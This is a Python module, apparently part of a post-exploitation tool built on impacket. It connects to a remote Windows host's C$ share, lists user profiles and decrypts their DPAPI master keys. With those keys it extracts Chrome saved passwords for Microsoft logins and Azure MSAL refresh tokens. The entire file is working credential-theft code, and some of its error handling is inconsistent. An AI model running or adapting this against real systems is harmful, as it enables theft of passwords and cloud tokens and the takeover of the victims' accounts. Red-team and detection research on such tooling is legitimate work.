import base64
import json
import logging
import os
import sqlite3
import tempfile
from typing import List

from impacket import dpapi
from connection_class import Connection
from file_class import File
from static_methods import deriveKeysFromUser, has_v10_header, decrypt_chrome_v80_password, USERNAME
from impacket.dpapi import MasterKeyFile, MasterKey
from impacket.uuid import bin_to_string


class Dpapi:
    dpapi = r"Users\{0}\AppData\{1}"
    c = "C$"

    def __init__(self, connection: Connection):
        self.logger = logging.getLogger(__name__)
        self.connection = connection
        self.file = File(self.connection)

    def get_users(self) -> List[USERNAME]:
        """
        Returns names of all the users in the target
        :return:
        """
        return [u.get_longname() for u in self.connection.connection.listPath(self.c, "Users" + r"\*")
                if u.get_longname() not in (".", "..", "Public", "Default", "Default User", "All Users")
                and u.is_directory()]

    def get_microsoft_files(self, user: str, master_keys: dict):
        """
        Function that decrypt microsoft blobs that contains refreshToken for Azure
        :param user: name of the user
        :param master_keys: all the master_keys
        :return:
        """
        local_state_path = (self.dpapi.format(user, "Local") + r"\.IdentityService\msal.cache")
        try:
            local_state_content = self.file.read_file(self.c, local_state_path)

        except KeyboardInterrupt:
            raise
        except Exception as e:
            self.logger.debug("File is not found or file is opened")
            # file is opened or not found
            return {}

        try:
            blob = dpapi.DPAPI_BLOB(local_state_content)
            mk_guid = bin_to_string(blob["GuidMasterKey"]).lower()
            master_key = master_keys[mk_guid]
            decrypt_blob = json.loads(blob.decrypt(master_key))
            return {decrypt_blob['Account'][list(decrypt_blob['Account'].keys())[0]]['username']:
                        decrypt_blob['RefreshToken'][list(decrypt_blob['RefreshToken'].keys())[0]]['secret']}
        except KeyboardInterrupt:
            raise
        except Exception as e:
            self.logger.debug("Failed to decrypt blob")
            return {}

    def get_keys(self, user: str):
        """
        Function to retrieve all master keys of user
        :param user: name of the user
        :return:
        """
        keys = {}
        for fold in ("Roaming", "Local"):
            try:
                user_path = (self.dpapi.format(user, fold) + r"\Microsoft\Protect")
                res = list(self.file.connection.connection.listPath(self.c, user_path + r"\*"))
                sid = [d.get_longname() for d in res if d.get_longname().startswith("S-1-")]
                if sid:
                    try:
                        files = list(self.file.connection.connection.listPath(self.c, r"{0}\{1}".format(user_path, sid[
                            0] + r"\*")))
                        for file in files:
                            if file.get_longname() not in (
                                    ".", "..", "Preferred") and not file.get_longname().startswith("BK-"):
                                path = r"{0}\{1}\{2}".format(user_path, sid[0], file.get_longname())
                                data = self.file.read_file(self.c, path)
                                mkf = MasterKeyFile(data)
                                data = data[len(mkf):]

                                if mkf['MasterKeyLen'] > 0:
                                    mk = MasterKey(data[:mkf['MasterKeyLen']])
                                    try:
                                        key1, key2, key3 = deriveKeysFromUser(sid[0], self.connection.password)
                                        decryptedKey = mk.decrypt(key3)
                                        if decryptedKey:
                                            keys[file.get_longname()] = decryptedKey
                                        else:
                                            decryptedKey = mk.decrypt(key2)
                                            if decryptedKey:
                                                keys[file.get_longname()] = decryptedKey
                                            else:
                                                decryptedKey = mk.decrypt(key1)
                                                if decryptedKey:
                                                    keys[file.get_longname()] = decryptedKey
                                    except:
                                        pass
                    except:
                        pass

            except:
                pass
        return keys

    def get_chrome_state_key(self, user: str, master_keys: dict) -> bytes:
        """
        Function that help to decrypt the password of chrome
        :param user:
        :param master_keys:
        :return:
        """
        local_state_path = (
                self.dpapi.format(user, "Local")
                + r"\Google\Chrome\User Data\Local State"
        )
        try:
            local_state_content = json.loads(
                self.file.read_file(self.c, local_state_path)
            )
        except KeyboardInterrupt:
            raise
        except Exception as e:
            self.logger.debug("File is not found or file is opened")
            # file is opened or not found
            return b""

        else:
            state_key_base64_decoded = base64.b64decode(
                local_state_content["os_crypt"]["encrypted_key"]
            )

            # DPAPI decryption. state_key_base64_decoded is "DPAPI" + <state_key>
            blob = dpapi.DPAPI_BLOB(state_key_base64_decoded[5:])
            mk_guid = bin_to_string(blob["GuidMasterKey"]).lower()
            master_key = master_keys[mk_guid]
            state_key: bytes = blob.decrypt(master_key)

            return state_key

    def get_chrome_password(self, user: str, master_keys: dict):
        """
        Function that decrypt chrome password
        :param user: name of the user
        :param master_keys: dict of master keys
        :return:
        """
        login_data_path = (
                self.dpapi.format(user, "Local")
                + r"\Google\Chrome\User Data\Default\Login Data"
        )
        decrypted_password = ""
        username = ""
        try:
            remote_content = self.file.read_file(self.c, login_data_path)
        except KeyboardInterrupt:
            raise
        except:
            self.logger.debug("File is not found or file is opened")
            return {}

        try:
            # Write temp file
            file_descriptor, temp_path = tempfile.mkstemp()
            try:
                with os.fdopen(file_descriptor, "wb") as tmp:
                    tmp.write(remote_content)
                with sqlite3.connect(temp_path) as connection:
                    cursor = connection.cursor()
                    sql_query = cursor.execute(
                        "SELECT action_url, origin_url, username_value, password_value, date_created "
                        "FROM logins"
                    )
                    fetched_values = sql_query.fetchall()
                    if 'login.microsoft' in fetched_values[0][0]:
                        for (
                                action_url,
                                origin_url,
                                username,
                                enc_password,
                                date,
                        ) in fetched_values:
                            if enc_password:
                                # Starting from chrome v80, there is a new encryption model
                                # https://xenarmor.com/how-to-recover-saved-passwords-google-chrome/
                                if has_v10_header(enc_password):
                                    try:

                                        # Password is encrypted. We need to decrypt it.
                                        # State key is used in encryption
                                        state_key = self.get_chrome_state_key(
                                            user, master_keys
                                        )
                                        decrypted_password = decrypt_chrome_v80_password(
                                            enc_password, state_key
                                        )
                                    except KeyboardInterrupt:
                                        raise
                                    except Exception as e:
                                        continue

                                else:
                                    try:
                                        # Convert password to DPAPI_BLOB struct
                                        password_blob = dpapi.DPAPI_BLOB(enc_password)
                                        # Get master key id from blob
                                        master_key = bin_to_string(
                                            password_blob["GuidMasterKey"]
                                        ).lower()
                                        # Decrypt the mpassword
                                        decrypted_password = password_blob.decrypt(
                                            master_keys[master_key]
                                        ).decode("utf8")
                                    except KeyError:
                                        continue
                connection.close()
                return decrypted_password, username
            except:
                return decrypted_password, username

            finally:
                os.remove(temp_path)
        except sqlite3.OperationalError as e:
            return decrypted_password, username

    def execute(self):
        """
        Main function of dpapi class
        :return:
        """
        try:
            res = {}
            for user in self.get_users():
                self.logger.debug(f"Getting master_keys of users {user}")
                master_keys = self.get_keys(user)
                if master_keys:
                    self.logger.info(f"Found {len(master_keys)} master keys")
                    self.logger.debug(f"Try to find password in Chrome browser for user {user}")
                    chrome_keys, username = self.get_chrome_password(user, master_keys)
                    if chrome_keys:
                        self.logger.info(f"Found password in Chrome browser")
                        res[user] = {"chrome_credentials": {"username": username, "password": chrome_keys}}
                    else:
                        self.logger.debug(f"Cant find password in Chrome browser for user {user}")
                    self.logger.debug("Try to find tokens in Microsoft products")
                    microsoft_keys = self.get_microsoft_files(user, master_keys)
                    if microsoft_keys:
                        self.logger.info(f"Found tokens in Microsoft platforms tokens")
                        res[user].update(username_and_refesh_token=microsoft_keys)
                    else:
                        self.logger.debug(f"Cant find tokens in Microsoft platforms")
                else:
                    self.logger.debug(f"Cant find master keys for user {user}")
            return res

        except KeyboardInterrupt:
            raise
        except Exception as e:
            if "STATUS_ACCESS_DENIED({Access Denied}" in str(e):
                self.logger.error("The User dose not have admin privilege access")
                raise
            else:
                self.logger.error(f"Failed to retrieve master keys from target {self.connection.target}")
                raise

